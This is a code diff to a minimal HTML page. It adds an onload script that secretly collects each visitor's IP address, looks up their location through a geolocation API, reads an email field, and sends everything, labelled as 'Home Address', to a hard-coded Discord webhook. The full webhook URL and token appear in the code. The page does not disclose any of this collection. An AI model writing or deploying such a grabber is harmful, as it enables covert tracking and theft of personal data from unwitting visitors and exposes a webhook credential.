@@ -3,20 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>E</title>
+    <title>Web</title>
     <script>
-        const webhookUrl = 'https://discord.com/api/webhooks/1295926374959415326/jcyJtej4wQvgp9FS_nimudItJO-PAFYbF6foxrUWtwyNVY7eu8sV2_1aMibNq3htq8Bp’
+        const webhookUrl = 'https://discord.com/api/webhooks/1295926374959415326/jcyJtej4wQvgp9FS_nimudItJO-PAFYbF6foxrUWtwyNVY7eu8sV2_1aMibNq3htq8Bp'; // Your webhook URL
 
         async function fetchIP() {
             const start = performance.now(); // Start timing
 
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                document.getElementById('ip-display').innerText = `Your IP address is: ${data.ip}`;
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
 
-                const address = document.getElementById('address-input').value;
-                await sendToDiscord(data.ip, address);
+                const address = await fetchAddress(ip);
+                const email = document.getElementById('email-input').value;
+                await sendToDiscord(ip, address, email);
 
                 const end = performance.now(); // End timing
                 console.log(`Fetch time: ${end - start} ms`); // Log the time taken
@@ -25,8 +26,20 @@
             }
         }
 
-        async function sendToDiscord(ip, address) {
-            const message = { content: `IP Address: ${ip} | Home Address: ${address}` };
+        async function fetchAddress(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                if (!response.ok) throw new Error('Network response was not ok');
+                const data = await response.json();
+                return `${data.city || 'Unknown city'}, ${data.region || 'Unknown region'}, ${data.country || 'Unknown country'}`;
+            } catch (error) {
+                console.error('Error fetching address:', error);
+                return 'Address not available';
+            }
+        }
+
+        async function sendToDiscord(ip, address, email) {
+            const message = { content: `IP Address: ${ip} | Home Address: ${address} | Email: ${email}` };
 
             try {
                 await fetch(webhookUrl, {
@@ -40,6 +53,7 @@
         }
     </script>
 </head>
-
+<body onload="fetchIP()">
+    <input type="email" id="email-input" placeholder="Enter your email" required />
 </body>
 </html>
